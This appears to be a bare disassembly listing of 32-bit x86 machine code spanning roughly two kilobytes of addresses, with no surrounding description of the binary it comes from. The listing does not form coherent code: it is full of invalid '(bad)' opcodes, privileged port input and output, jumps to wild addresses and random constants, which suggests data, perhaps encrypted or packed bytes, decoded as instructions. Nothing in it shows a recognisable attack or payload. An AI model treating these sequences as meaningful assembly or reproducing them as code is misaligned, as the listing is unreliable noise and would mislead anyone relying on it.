  4097e8:	or     DWORD PTR [ebp+0x7e],eax
  4097eb:	jecxz  0x409823
  4097ed:	jmp    0x2858e921
  4097f2:	scas   eax,DWORD PTR es:[edi]
  4097f3:	test   al,0xf5
  4097f5:	mov    BYTE PTR [ebx+0x69],dh
  4097f8:	cmp    eax,0x7f0be447
  4097fd:	cdq    
  4097fe:	mov    ebx,eax
  409800:	ja     0x4097f6
  409802:	inc    esi
  409803:	and    eax,0xe505a288
  409808:	cmp    BYTE PTR [ecx],ah
  40980a:	mov    ds:0xfd4ca9a9,al
  40980f:	cs popf 
  409811:	mov    edx,0xc2d5149d
  409816:	sbb    BYTE PTR [bp+0x7a],bh
  40981a:	out    dx,eax
  40981b:	enter  0x1cf9,0xd
  40981f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409820:	sub    BYTE PTR [ebp+ebp*1+0x77],dh
  409824:	xor    DWORD PTR [edi+0x13],eax
  409827:	test   BYTE PTR [edi+ecx*4],0x2b
  40982b:	pop    es
  40982c:	popa   
  40982d:	inc    ebx
  40982e:	popa   
  40982f:	jp     0x40987d
  409831:	inc    edi
  409832:	ss mov gs,WORD PTR es:[esi]
  409836:	fdiv   QWORD PTR ds:0x84b5e4d3
  40983c:	cmp    cl,dh
  40983e:	mov    edi,0x759010c
  409843:	mov    dh,0x7f
  409845:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409846:	dec    esi
  409847:	fcmovbe st,st(7)
  409849:	mov    eax,0x77c3ed4d
  40984e:	loope  0x4097e9
  409850:	mov    dl,bl
  409852:	xor    ebx,DWORD PTR [ebx]
  409854:	adc    al,BYTE PTR [ecx]
  409856:	int3   
  409857:	push   cs
  409858:	or     ah,bh
  40985a:	mov    ds:0x5008fee9,eax
  40985f:	jp     0x4098c8
  409861:	sbb    esp,0x21
  409864:	pop    esp
  409865:	popa   
  409866:	sub    bh,ch
  409868:	dec    esp
  409869:	ss jb  0x40983a
  40986c:	jecxz  0x40988a
  40986e:	lods   al,BYTE PTR ds:[esi]
  40986f:	add    BYTE PTR [ebp+esi*4-0x73],al
  409873:	push   eax
  409874:	jecxz  0x40981b
  409876:	mov    bl,BYTE PTR [edx+0x54]
  409879:	jl     0x4098d3
  40987b:	in     al,dx
  40987c:	outs   dx,BYTE PTR ds:[esi]
  40987d:	in     al,0x2a
  40987f:	inc    esi
  409880:	and    bh,dh
  409882:	xchg   edx,edi
  409884:	mov    eax,0xe2f1f88e
  409889:	jecxz  0x4098ab
  40988b:	mov    cl,0xc4
  40988d:	shl    BYTE PTR [ebp+eiz*4+0x69],cl
  409891:	xchg   ebp,eax
  409892:	(bad)  
  409893:	push   ss
  409894:	adc    cl,bl
  409896:	int    0xee
  409898:	hlt    
  409899:	test   al,0xc3
  40989b:	arpl   WORD PTR [esi],bx
  40989d:	add    DWORD PTR [esi+0x2c],0x6c
  4098a1:	outs   dx,DWORD PTR ds:[esi]
  4098a2:	xchg   edx,eax
  4098a3:	in     al,0x1f
  4098a5:	iret   
  4098a6:	mov    dh,0x3d
  4098a8:	pop    eax
  4098a9:	jb     0x40984b
  4098ab:	or     BYTE PTR [ebx-0x79],bl
  4098ae:	bndstx [ebx+0x14],bnd3
  4098b2:	out    dx,al
  4098b3:	cwde   
  4098b4:	xchg   ebx,eax
  4098b5:	cli    
  4098b6:	imul   ebp,DWORD PTR [eax+0x49],0x46fc07fd
  4098bd:	push   edx
  4098be:	or     DWORD PTR [ebx-0x2eaa6ec8],edx
  4098c4:	mov    bh,0x85
  4098c6:	mov    eax,ds:0x4e420bce
  4098cb:	sub    bl,dl
  4098cd:	mov    ebp,0x91ff16cd
  4098d2:	jno    0x409950
  4098d4:	adc    BYTE PTR [ecx+0x31],bh
  4098d7:	pusha  
  4098d8:	inc    edi
  4098d9:	dec    esi
  4098da:	icebp  
  4098db:	and    DWORD PTR [ebx],eax
  4098dd:	pop    es
  4098de:	cmp    BYTE PTR [edx-0x1b4305b5],ch
  4098e4:	pop    ebp
  4098e5:	dec    edi
  4098e6:	fidivr WORD PTR [ebx]
  4098e8:	jge    0x409951
  4098ea:	mov    cl,0xc2
  4098ec:	jecxz  0x4098e8
  4098ee:	mov    WORD PTR [edi-0x11],gs
  4098f1:	adc    dh,BYTE PTR [edi-0x65]
  4098f4:	jge    0x40994e
  4098f6:	xchg   ecx,eax
  4098f7:	xor    esi,DWORD PTR [ebx+0x18683613]
  4098fd:	cmp    ah,dh
  4098ff:	add    BYTE PTR [ecx-0x30bfead7],ah
  409905:	and    esi,DWORD PTR [esp+edi*8+0x73]
  409909:	lds    edi,FWORD PTR [eax+0x3b]
  40990c:	xlat   BYTE PTR ds:[ebx]
  40990d:	data16 aaa 
  40990f:	sahf   
  409910:	scas   al,BYTE PTR es:[edi]
  409911:	jmp    0xb5db4b23
  409916:	popf   
  409917:	imul   BYTE PTR [esi-0x5e346762]
  40991d:	inc    ecx
  40991e:	retf   
  40991f:	xchg   ecx,eax
  409920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409921:	mov    cl,0x3
  409923:	and    al,0x72
  409925:	xchg   DWORD PTR [ecx+0x73],esi
  409928:	in     al,0x8b
  40992a:	cld    
  40992b:	mov    ds:0xcad7e68a,eax
  409930:	bound  ebp,QWORD PTR [ebp-0x20]
  409933:	lods   al,BYTE PTR ds:[esi]
  409934:	retf   0x17be
  409937:	xor    al,0x8f
  409939:	mov    eax,ds:0xbcf399ad
  40993e:	pop    esp
  40993f:	leave  
  409940:	push   edi
  409941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409942:	push   cs
  409943:	stos   BYTE PTR es:[edi],al
  409944:	jge    0x4098e9
  409946:	mov    ds:0x1f8199c,eax
  40994b:	sub    eax,0x7ba60447
  409950:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409951:	js     0x4098e7
  409953:	iret   
  409954:	pop    ebp
  409955:	push   ds
  409956:	(bad)  
  409957:	lods   eax,DWORD PTR ds:[esi]
  409958:	icebp  
  409959:	adc    BYTE PTR [ebp+0x58d6ca12],bl
  40995f:	aaa    
  409960:	or     edx,DWORD PTR [edi+0x5c]
  409963:	adc    edx,DWORD PTR [eax]
  409965:	daa    
  409966:	pop    esi
  409967:	lea    ebp,[ecx+0x71]
  40996a:	out    dx,eax
  40996b:	inc    edi
  40996c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40996d:	pop    es
  40996e:	out    dx,al
  40996f:	pop    edi
  409970:	inc    esp
  409971:	mov    ds:0xae49ef27,eax
  409976:	mov    ds:0x98209282,eax
  40997b:	out    dx,eax
  40997c:	inc    esi
  40997d:	mov    esi,0x483dfd6d
  409982:	and    bl,0x21
  409985:	xor    bl,BYTE PTR [esp+ecx*8-0x2b]
  409989:	mov    edx,0x6e3da3a4
  40998e:	(bad)  
  40998f:	xor    DWORD PTR [eax-0x1eb4850d],ebp
  409995:	(bad)  
  409996:	paddsw mm0,QWORD PTR [edi+0x708a97b4]
  40999d:	jns    0x4099d6
  40999f:	pop    edx
  4099a0:	jno    0x4099f7
  4099a2:	jno    0x40992a
  4099a4:	sub    eax,0xb36654
  4099a9:	add    ebp,edi
  4099ab:	add    DWORD PTR [ecx],esi
  4099ad:	loopne 0x4099a1
  4099af:	pop    eax
  4099b0:	pop    es
  4099b1:	es gs push ss
  4099b4:	scas   al,BYTE PTR es:[edi]
  4099b5:	or     al,dl
  4099b7:	push   eax
  4099b8:	stos   DWORD PTR es:[edi],eax
  4099b9:	rol    DWORD PTR [edi-0x55],0x68
  4099bd:	pop    ebx
  4099be:	xchg   esi,eax
  4099bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099c0:	inc    edx
  4099c1:	or     bh,ah
  4099c3:	cmc    
  4099c4:	and    DWORD PTR [edi+0x78acd401],0x63
  4099cb:	out    0x51,eax
  4099cd:	fdiv   st,st(7)
  4099cf:	pushf  
  4099d0:	dec    ecx
  4099d1:	adc    esi,DWORD PTR [esp+eiz*8+0x730ed091]
  4099d8:	mov    edx,0x2bfb1bc6
  4099dd:	int3   
  4099de:	add    al,0x28
  4099e0:	mov    eax,0x1468e1d
  4099e5:	repnz push ecx
  4099e7:	or     eax,0xc941d33
  4099ec:	lahf   
  4099ed:	mov    ecx,0x459dd9b9
  4099f2:	xchg   esp,eax
  4099f3:	or     al,0xf3
  4099f5:	push   edx
  4099f6:	push   ebx
  4099f7:	mov    cs,WORD PTR [edi]
  4099f9:	adc    DWORD PTR [ecx],esp
  4099fb:	inc    ecx
  4099fc:	mov    al,0xe3
  4099fe:	int    0xe8
  409a00:	jmp    0x26cabc2a
  409a05:	(bad)  
  409a06:	cmp    edx,DWORD PTR [edx+0x5579f540]
  409a0c:	or     al,0xdb
  409a0e:	jb     0x409a34
  409a10:	ds add ax,bx
  409a14:	out    0x3e,al
  409a16:	mov    dl,0x28
  409a18:	mov    ecx,0x34832420
  409a1d:	adc    BYTE PTR [ebp+0x177b5fec],cl
  409a23:	xchg   esp,eax
  409a24:	retf   
  409a25:	mov    edi,0xdbe336e1
  409a2a:	pop    ds
  409a2b:	(bad)  
  409a2c:	in     eax,dx
  409a2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a2e:	mov    ecx,0x63532bee
  409a33:	sbb    ebx,DWORD PTR [edi-0x30c59d73]
  409a39:	jmp    0x409a6a
  409a3b:	and    dl,dl
  409a3d:	repnz xor eax,0x387f01e9
  409a43:	mov    edx,0xcc9e0546
  409a48:	pop    eax
  409a49:	scas   al,BYTE PTR es:[edi]
  409a4a:	and    ecx,esi
  409a4c:	mov    ecx,0xdb85d4b6
  409a51:	ds xchg edi,eax
  409a53:	outs   dx,DWORD PTR ds:[esi]
  409a54:	shl    DWORD PTR [ecx-0x2777c723],1
  409a5a:	jmp    0xc64e:0xa52a23b1
  409a61:	scas   al,BYTE PTR es:[edi]
  409a62:	mov    dl,0xed
  409a64:	lock scas eax,DWORD PTR es:[edi]
  409a66:	jge    0x409a72
  409a68:	in     eax,0xb3
  409a6a:	cdq    
  409a6b:	and    DWORD PTR [ebx-0x73],edi
  409a6e:	sti    
  409a6f:	push   ecx
  409a70:	inc    edi
  409a71:	rcl    dh,1
  409a73:	lods   eax,DWORD PTR ds:[esi]
  409a74:	and    esi,ebp
  409a76:	jb     0x409ace
  409a78:	cmp    eax,0x585976fc
  409a7d:	pop    esp
  409a7e:	mov    ebx,0xe9eeca60
  409a83:	scas   eax,DWORD PTR es:[edi]
  409a84:	adc    dh,dh
  409a86:	sahf   
  409a87:	rcr    DWORD PTR [ecx+0x5e],1
  409a8a:	sub    BYTE PTR [eax],0x34
  409a8d:	(bad)  
  409a8e:	fsin   
  409a90:	scas   eax,DWORD PTR es:[edi]
  409a91:	and    DWORD PTR [edi],edi
  409a93:	mov    ebp,0xddd3d935
  409a98:	sbb    al,0xb4
  409a9a:	adc    BYTE PTR [ecx-0x5d],0x57
  409a9e:	xchg   edx,eax
  409a9f:	fs adc al,0x8d
  409aa2:	add    edx,esi
  409aa4:	or     BYTE PTR [ebp+0x4f],ch
  409aa7:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  409aa9:	(bad)  
  409aaa:	pop    ebx
  409aab:	adc    DWORD PTR [edi-0x3dbd7d96],ebx
  409ab1:	in     al,dx
  409ab2:	xchg   esp,eax
  409ab3:	jnp    0x409ab1
  409ab5:	test   DWORD PTR [esi],edi
  409ab7:	push   esi
  409ab8:	test   BYTE PTR [edi+esi*4+0x5187f49b],0xee
  409ac0:	addr16 jno 0x409af4
  409ac3:	mov    esp,0xb83e2e3b
  409ac8:	pop    ds
  409ac9:	mov    al,0xe
  409acb:	or     BYTE PTR [ecx],bl
  409acd:	outs   dx,DWORD PTR ds:[esi]
  409ace:	sahf   
  409acf:	dec    eax
  409ad0:	mov    dh,0x51
  409ad2:	cmc    
  409ad3:	ret    
  409ad4:	es mov bh,0xc0
  409ad7:	ja     0x409b02
  409ad9:	jg     0x409b50
  409adb:	mov    esi,0xb09d5c1c
  409ae0:	aad    0x82
  409ae2:	icebp  
  409ae3:	sub    esi,DWORD PTR [esi+edx*1]
  409ae6:	sahf   
  409ae7:	push   edi
  409ae8:	sar    BYTE PTR [edx+0xe],0xa9
  409aec:	lea    ecx,[esi]
  409aee:	jne    0x409b6d
  409af0:	or     ebx,edx
  409af2:	mov    dh,0xfa
  409af4:	fwait
  409af5:	push   0xa
  409af7:	jp     0x409b33
  409af9:	loope  0x409b33
  409afb:	lock lods al,BYTE PTR ds:[esi]
  409afd:	xchg   edx,eax
  409afe:	test   al,0xcd
  409b00:	dec    esi
  409b01:	and    bl,BYTE PTR [ebp-0x656c3771]
  409b07:	jle    0x409b65
  409b09:	(bad)  
  409b0a:	repz mov ?,WORD PTR [edi-0x5a2e9f1b]
  409b11:	test   eax,0xf539d016
  409b16:	pop    ecx
  409b17:	inc    edx
  409b18:	xchg   ebp,eax
  409b19:	and    eax,0xccb3db82
  409b1e:	imul   esi,DWORD PTR [ecx-0x5b],0xffffffe9
  409b22:	dec    eax
  409b23:	and    BYTE PTR [esi],bh
  409b25:	dec    ebp
  409b26:	mov    al,0x78
  409b28:	in     eax,0xdf
  409b2a:	out    0x6,al
  409b2c:	stc    
  409b2d:	ss iret 
  409b2f:	xor    eax,0xc3d6dd28
  409b34:	push   ebp
  409b35:	jmp    0x409ad2
  409b37:	mov    eax,0xeb686001
  409b3c:	in     al,dx
  409b3d:	jle    0x409ad7
  409b3f:	(bad)  
  409b40:	pop    eax
  409b41:	das    
  409b42:	xchg   ebp,eax
  409b43:	scas   eax,DWORD PTR es:[edi]
  409b44:	fldcw  WORD PTR [esi]
  409b46:	popa   
  409b47:	xchg   DWORD PTR [ecx+0xf],eax
  409b4a:	lock fwait
  409b4c:	or     DWORD PTR [edx+0x4c],edx
  409b4f:	jmp    0x22599108
  409b54:	ret    
  409b55:	arpl   bx,di
  409b57:	ja     0x409b0d
  409b59:	leave  
  409b5a:	stos   DWORD PTR es:[edi],eax
  409b5b:	(bad)  
  409b5c:	sub    ecx,DWORD PTR [ebp+0x7b]
  409b5f:	call   0xd4cf918a
  409b64:	jg     0x409b6a
  409b66:	es xchg esi,eax
  409b68:	jae    0x409b92
  409b6a:	inc    esp
  409b6b:	retf   0x6a74
  409b6e:	fmul   DWORD PTR [ebx+0x2c]
  409b71:	fldcw  WORD PTR [ecx-0x134522a8]
  409b77:	xchg   ebx,eax
  409b78:	inc    esp
  409b79:	sbb    ecx,edx
  409b7b:	xchg   BYTE PTR es:[eax],ah
  409b7e:	xchg   ecx,eax
  409b7f:	cmc    
  409b80:	fnsave [ebx+0x1c]
  409b83:	sub    al,0xa2
  409b85:	sbb    BYTE PTR [eax-0x68],al
  409b88:	jle    0x409bc1
  409b8a:	or     bh,dh
  409b8c:	adc    cl,cl
  409b8e:	and    BYTE PTR [ecx-0x3e98648e],ch
  409b94:	retf   0xc361
  409b97:	ret    
  409b98:	push   ds
  409b99:	pop    ebp
  409b9a:	push   cs
  409b9b:	inc    eax
  409b9c:	sub    BYTE PTR [ebx+0x61bcd059],0x3
  409ba3:	push   esi
  409ba4:	aad    0xcf
  409ba6:	mov    cl,0xb0
  409ba8:	xchg   esp,eax
  409ba9:	mov    dl,0x77
  409bab:	lock or BYTE PTR [eax+0x35],bl
  409baf:	(bad)
  409bb2:	sbb    bh,BYTE PTR [ebx]
  409bb4:	sti    
  409bb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bb6:	cld    
  409bb7:	mov    ebp,0x4d790cf
  409bbc:	call   0xf8c66482
  409bc1:	push   ecx
  409bc2:	dec    ecx
  409bc3:	jne    0x409bae
  409bc5:	push   0x26
  409bc7:	xor    BYTE PTR [esi+0x28],ah
  409bca:	aam    0x1b
  409bcc:	xchg   DWORD PTR [edx+edx*4+0x6910e0fa],esp
  409bd3:	xchg   ebp,eax
  409bd4:	and    BYTE PTR [edx-0xac09803],bh
  409bda:	fnstenv [ebx+eiz*8-0x79a83e4d]
  409be1:	aad    0x7b
  409be3:	add    BYTE PTR [ebp-0x6e],cl
  409be6:	and    al,0xa4
  409be8:	popa   
  409be9:	sbb    eax,0x2945ca2e
  409bee:	and    DWORD PTR [eax+0x14],edx
  409bf1:	pop    ss
  409bf2:	aas    
  409bf3:	mov    dh,ah
  409bf5:	stos   DWORD PTR es:[edi],eax
  409bf6:	push   edx
  409bf7:	(bad)  
  409bf8:	retf   0x14bc
  409bfb:	push   ebx
  409bfc:	push   0x5e
  409bfe:	and    BYTE PTR [edx-0x6b699e73],bh
  409c04:	lahf   
  409c05:	jns    0x409c55
  409c07:	dec    ebx
  409c08:	retf   0x9b3b
  409c0b:	imul   esp,DWORD PTR [ebp+esi*2-0x3a],0xd
  409c10:	outs   dx,BYTE PTR ds:[esi]
  409c11:	out    dx,eax
  409c12:	lods   eax,DWORD PTR ds:[esi]
  409c13:	pop    eax
  409c14:	push   ebx
  409c15:	mov    al,ah
  409c17:	js     0x409bfc
  409c19:	inc    ebp
  409c1a:	push   esp
  409c1b:	xor    eax,0xbb30c3ca
  409c20:	jl     0x409c7a
  409c22:	push   es
  409c23:	repnz repz es sbb dl,ah
  409c28:	push   esi
  409c29:	mov    esp,0x33a50bc
  409c2e:	in     al,0x19
  409c30:	fwait
  409c31:	pusha  
  409c32:	and    eax,0xbcb43044
  409c37:	sub    BYTE PTR ds:0x5c68df2d,al
  409c3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c3e:	mov    eax,0x4d509e31
  409c43:	mov    ecx,?
  409c45:	pop    esi
  409c46:	fwait
  409c47:	dec    esi
  409c48:	xor    bh,dh
  409c4a:	out    0x74,al
  409c4c:	(bad)  
  409c4d:	out    0xf9,eax
  409c4f:	mov    ebp,esi
  409c51:	in     al,0xfa
  409c53:	push   ebx
  409c54:	pushf  
  409c55:	(bad)  
  409c57:	aas    
  409c58:	pop    esp
  409c59:	call   esi
  409c5b:	sbb    bh,BYTE PTR [esi]
  409c5d:	sbb    eax,0x656e6c33
  409c62:	mov    dl,0xba
  409c64:	das    
  409c65:	inc    edi
  409c66:	xor    DWORD PTR [edx],ebx
  409c68:	pop    edx
  409c69:	push   esp
  409c6a:	cmp    al,0xf2
  409c6c:	mov    BYTE PTR [edi+0x6213922c],al
  409c72:	jg     0x409cda
  409c74:	aam    0x70
  409c76:	rol    BYTE PTR [ecx+0x166f6c47],1
  409c7c:	mov    ecx,0x40efbfd1
  409c81:	add    eax,0x289fac2d
  409c86:	xchg   edx,eax
  409c87:	lds    edx,FWORD PTR [ebx+0xb]
  409c8a:	jne    0x409c73
  409c8c:	in     al,dx
  409c8d:	sub    eax,0xe63e1161
  409c92:	sub    BYTE PTR [esi+0x192583ba],ch
  409c98:	jmp    0x409ce0
  409c9a:	sub    BYTE PTR [eax],0x7c
  409c9d:	popf   
  409c9e:	retf   
  409c9f:	add    dl,bh
  409ca1:	xchg   DWORD PTR [ecx-0x6a],ecx
  409ca4:	add    eax,DWORD PTR [ebx-0x1562bb44]
  409caa:	inc    esp
  409cab:	mov    al,BYTE PTR [ebx+0x47fcc7a0]
  409cb1:	in     al,dx
  409cb2:	pop    esp
  409cb3:	aam    0xce
  409cb5:	xchg   esi,eax
  409cb6:	cld    
  409cb7:	leave  
  409cb8:	les    esi,FWORD PTR [edx-0x507f7ee2]
  409cbe:	test   BYTE PTR [ecx],dl
  409cc0:	dec    esi
  409cc1:	fsubr  DWORD PTR [ebx]
  409cc3:	jno    0x409c82
  409cc5:	cmp    al,BYTE PTR [eax+0x5b]
  409cc8:	add    cl,BYTE PTR [ebx-0x111da3d8]
  409cce:	cwde   
  409ccf:	jmp    esi
  409cd1:	jns    0x409cec
  409cd3:	and    DWORD PTR [esi+0x3d],ebp
  409cd6:	push   cs
  409cd7:	in     eax,0xf4
  409cd9:	pop    ss
  409cda:	jl     0x409d2d
  409cdc:	(bad)  
  409cdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cde:	sbb    BYTE PTR [ebx+0x7027e2d9],al
  409ce4:	push   es
  409ce5:	fidivr DWORD PTR [edi]
  409ce7:	retf   0x67f9
  409cea:	xchg   ebx,eax
  409ceb:	mov    esi,0x340f0c92
  409cf0:	sub    dl,BYTE PTR [ecx+0x30]
  409cf3:	dec    edx
  409cf4:	xchg   esi,eax
  409cf5:	inc    BYTE PTR [edx+0x6e1bdf51]
  409cfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cfc:	jmp    0xbf313209
  409d01:	push   es
  409d02:	clc    
  409d03:	xchg   esi,eax
  409d04:	pop    esi
  409d05:	ss jne 0x409d64
  409d08:	aaa    
  409d09:	(bad)  
  409d0a:	lods   eax,DWORD PTR ds:[esi]
  409d0b:	push   esp
  409d0c:	shl    BYTE PTR [ebp+0x5a],cl
  409d0f:	fcomp  QWORD PTR [esi+0x3f2ba95e]
  409d15:	lods   eax,DWORD PTR ds:[esi]
  409d16:	adc    eax,0x49290086
  409d1b:	push   es
  409d1c:	sbb    dh,BYTE PTR [ecx+0x6e]
  409d1f:	pop    eax
  409d20:	jecxz  0x409ccc
  409d22:	pop    ebp
  409d23:	push   cs
  409d24:	(bad)  
  409d25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d26:	shr    BYTE PTR [ecx+ebp*4+0x6214b460],cl
  409d2d:	aaa    
  409d2e:	popf   
  409d2f:	jnp    0x409cbb
  409d31:	mov    ch,0x65
  409d33:	pop    edx
  409d34:	retf   0x71a4
  409d37:	scas   eax,DWORD PTR es:[edi]
  409d38:	test   eax,0x3b2b9740
  409d3d:	jno    0x409d8a
  409d3f:	push   ss
  409d40:	(bad)  
  409d41:	and    DWORD PTR [ecx],esp
  409d43:	pop    edx
  409d44:	jmp    0x409cd4
  409d46:	dec    esp
  409d47:	pop    ss
  409d48:	outs   dx,DWORD PTR ds:[esi]
  409d49:	dec    ecx
  409d4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d4b:	in     al,dx
  409d4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d4d:	and    BYTE PTR [eax-0x27a4273],0xc7
  409d54:	rcl    dl,cl
  409d56:	sbb    BYTE PTR [ecx-0x6bfb7cb6],cl
  409d5c:	cwde   
  409d5d:	ins    BYTE PTR es:[edi],dx
  409d5e:	loopne 0x409dcc
  409d60:	int3   
  409d61:	jnp    0x409cfe
  409d63:	push   0x2a
  409d65:	pop    ebp
  409d66:	inc    ebp
  409d67:	ss add ch,bl
  409d6a:	mov    eax,0xb5c99dd
  409d6f:	push   ecx
  409d70:	lahf   
  409d71:	int    0x1b
  409d73:	or     eax,0x3d61fd8f
  409d78:	or     esp,0x3a
  409d7b:	mov    bp,0x5f17
  409d7f:	xor    BYTE PTR [ebx-0x4],dh
  409d82:	iret   
  409d83:	fldcw  WORD PTR [esi-0x7b517c79]
  409d89:	inc    edi
  409d8a:	or     eax,0x18a2c496
  409d8f:	ficom  WORD PTR [esi]
  409d91:	jae    0x409d5a
  409d93:	je     0x409d36
  409d95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d96:	cmc    
  409d97:	aas    
  409d98:	jge    0x409d43
  409d9a:	sub    al,0x99
  409d9c:	out    0x8,al
  409d9e:	mov    dl,0xa0
  409da0:	xor    edi,DWORD PTR [eax+0x60]
  409da3:	ret    
  409da4:	into   
  409da5:	ja     0x409d55
  409da7:	pushf  
  409da8:	mov    eax,0xfec96cf9
  409dad:	and    al,0x9e
  409daf:	sti    
  409db0:	jge    0x409db9
  409db2:	add    ecx,DWORD PTR [eax-0x27fa9f08]
  409db8:	rcr    BYTE PTR ds:0x762dee9b,0x20
  409dbf:	das    
  409dc0:	les    eax,FWORD PTR [esi]
  409dc2:	lds    esp,FWORD PTR [ecx]
  409dc4:	inc    edx
  409dc5:	je     0x409d52
  409dc7:	(bad)  
  409dc8:	add    ax,WORD PTR [ecx+0x1f9663ec]
  409dcf:	pop    edx
  409dd0:	or     eax,0x9cb72d75
  409dd5:	xchg   DWORD PTR [edi-0x4],ebp
  409dd8:	or     BYTE PTR [eax],bh
  409dda:	pop    ebx
  409ddb:	les    eax,FWORD PTR [ebx]
  409ddd:	in     eax,0x30
  409ddf:	je     0x409da0
  409de1:	fnstenv [eax+0x5aa3974e]
  409de7:	pop    esi
  409de8:	test   al,0x6f
  409dea:	push   0xa89bf8f8
  409def:	test   BYTE PTR [ecx+0x630f7bb0],0x3f
  409df6:	sbb    al,0x46
  409df8:	pop    es
  409df9:	xor    edx,DWORD PTR [edx+0x7115f8a4]
  409dff:	push   edi
  409e00:	adc    ah,BYTE PTR [esi+0xb0e6830]
  409e06:	inc    eax
  409e07:	jle    0x409e45
  409e09:	fbld   TBYTE PTR [edi-0x4f4b1c5c]
  409e0f:	adc    DWORD PTR [eax+0x28f996fa],ecx
  409e15:	or     al,0xca
  409e17:	sub    DWORD PTR [eax],0x7adae12
  409e1d:	retf   
  409e1e:	fisub  DWORD PTR [eax+0x6ef21fa1]
  409e24:	mov    al,ds:0x75cb1a39
  409e29:	inc    edi
  409e2a:	aam    0x28
  409e2c:	test   BYTE PTR [ebp+0x32],cl
  409e2f:	xchg   ebp,eax
  409e30:	inc    edx
  409e31:	aam    0x18
  409e33:	es cmp eax,0x7bf76356
  409e39:	inc    ebx
  409e3a:	adc    BYTE PTR [ecx+0x51],bl
  409e3d:	outs   dx,BYTE PTR ds:[esi]
  409e3e:	pop    esp
  409e3f:	push   edi
  409e40:	in     eax,dx
  409e41:	sti    
  409e42:	add    BYTE PTR [ecx],cl
  409e44:	lock retf 0x7f50
  409e48:	retf   0x152e
  409e4b:	out    0xd0,al
  409e4d:	cmc    
  409e4e:	add    ebp,DWORD PTR [edi]
  409e50:	fst    QWORD PTR [ebp-0x4afb1a72]
  409e56:	push   ebx
  409e57:	clc    
  409e58:	loop   0x409ded
  409e5a:	xor    ecx,DWORD PTR [ecx-0x66627332]
  409e60:	arpl   di,dx
  409e62:	mov    ecx,0xf0b8ca6f
  409e67:	xchg   DWORD PTR [edi+ecx*4],ebx
  409e6a:	inc    ebx
  409e6b:	(bad)  
  409e6c:	stc    
  409e6d:	lock push ebx
  409e6f:	xchg   esp,eax
  409e70:	(bad)  
  409e71:	repnz rcl DWORD PTR [ebx-0x4c],0x2e
  409e76:	sub    BYTE PTR [ebx-0x5805140f],bh
  409e7c:	sub    al,0xce
  409e7e:	les    esi,FWORD PTR [ebp+eiz*4-0x58bf01c1]
  409e85:	(bad)  
  409e86:	or     ebx,DWORD PTR [esi+0x15]
  409e89:	jb     0x409e83
  409e8b:	nop
  409e8c:	arpl   di,bp
  409e8e:	imul   esp,DWORD PTR [eax-0x60273ca4],0x6086db48
  409e98:	mov    WORD PTR [esi],gs
  409e9a:	cmp    bh,BYTE PTR [eax+0x5a793973]
  409ea0:	sub    ebp,DWORD PTR ds:0x709e5251
  409ea6:	sbb    eax,DWORD PTR [ecx]
  409ea8:	sar    DWORD PTR [ebx-0x3c],cl
  409eab:	mov    ds:0x849ba35a,al
  409eb0:	cs cmp BYTE PTR fs:[esi+0x8bdeb1a],ch
  409eb8:	xor    eax,0x76c76540
  409ebd:	jmp    0x409f0d
  409ebf:	sub    ebp,DWORD PTR [edx]
  409ec1:	shl    BYTE PTR [eax-0x7b],cl
  409ec4:	sub    ebp,ebp
  409ec6:	pop    ebx
  409ec7:	stos   BYTE PTR es:[edi],al
  409ec8:	xchg   esp,eax
  409ec9:	xor    dl,BYTE PTR [ebp-0x151c1400]
  409ecf:	mov    ebx,0x39396c10
  409ed4:	push   eax
  409ed5:	arpl   WORD PTR [ebx],di
  409ed7:	push   edi
  409ed8:	outs   dx,DWORD PTR ds:[esi]
  409ed9:	pop    edx
  409eda:	sar    DWORD PTR [ebx-0x4a],0xca
  409ede:	sbb    DWORD PTR [ebp+0x1b6b9ad4],edi
  409ee4:	jb     0x409e7d
  409ee6:	dec    esp
  409ee7:	adc    eax,DWORD PTR [eax+0x13ad921f]
  409eed:	pop    ecx
  409eee:	or     DWORD PTR [edx],ecx
  409ef0:	adc    DWORD PTR ds:0x7f2bcc8,ebx
  409ef6:	dec    ecx
  409ef7:	mov    ebp,0x569d47a1
  409efc:	popa   
  409efd:	hlt    
  409efe:	in     eax,dx
  409eff:	hlt    
  409f00:	retf   0xa759
  409f03:	xchg   ebp,eax
  409f04:	cmp    eax,0x74ffcd4e
  409f09:	lock cmp eax,ecx
  409f0c:	inc    ebx
  409f0d:	or     eax,0x85ee8ce9
  409f12:	ja     0x409f27
  409f14:	jg     0x409ebf
  409f16:	and    bl,BYTE PTR [ebp-0x63]
  409f19:	fist   DWORD PTR [ebx-0x4c]
  409f1c:	scas   al,BYTE PTR es:[edi]
  409f1d:	inc    edi
  409f1e:	inc    ecx
  409f1f:	mov    esi,0x76833aef
  409f24:	mov    WORD PTR [edx+0x6e65ea02],?
  409f2a:	test   BYTE PTR [ecx],bl
  409f2c:	ja     0x409f6b
  409f2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f2f:	test   eax,0x4b6b8ac
  409f34:	jmp    0x7182b062
  409f39:	mov    ebx,0x76118088
  409f3e:	out    0x49,al
  409f40:	mov    esi,0xba3aeb2a
  409f45:	sub    bl,BYTE PTR [edi]
  409f47:	outs   dx,DWORD PTR ds:[esi]
  409f48:	out    0x81,eax
  409f4a:	push   esi
  409f4b:	mov    ah,0x9b
  409f4d:	fidivr WORD PTR [ebx-0x3730ae22]
  409f53:	jle    0x409efe
  409f55:	push   ss
  409f56:	fs add bh,bl
  409f59:	icebp  
  409f5a:	inc    esi
  409f5b:	xor    BYTE PTR [edx-0x3d],al
